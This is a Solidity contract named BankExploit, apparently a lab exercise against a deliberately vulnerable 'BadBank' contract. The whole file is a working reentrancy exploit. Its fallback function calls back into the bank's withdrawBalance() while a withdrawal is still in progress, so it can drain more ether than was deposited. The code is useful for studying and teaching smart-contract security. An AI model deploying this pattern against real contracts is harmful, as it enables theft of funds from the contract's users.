pragma solidity ^0.4.23;

import "./BadBank.sol";
contract BankExploit {
  bool is_attack;
  address bankAddress;
  /*Constructor for the bank exploit sets up which contract you want to attack, and
  a boolean for whether or not to attack*/
  function BankExploit(address _bankAddress, bool _is_attack) payable{
    bankAddress = _bankAddress;
    is_attack = _is_attack;
  }
  //Complete
  function() payable public{
    if(is_attack==true)
       {
           if(bankAddress.call(bytes4(keccak256("withdrawBalance()")))) {

           }
       }
  }
  //Complete
  function deposit() payable public{
    if(bankAddress.call.value(msg.value).gas(20764)(bytes4(keccak256("addToBalance()")))
       ==false) {
              throw;
          }
  }
  //Complete
  function withdraw() payable public{
    if(bankAddress.call(bytes4(keccak256("withdrawBalance()")))==false ) {
             throw;
           }
  }
  function checkBalance() public returns(uint256){
    return address(this).balance;
  }
}
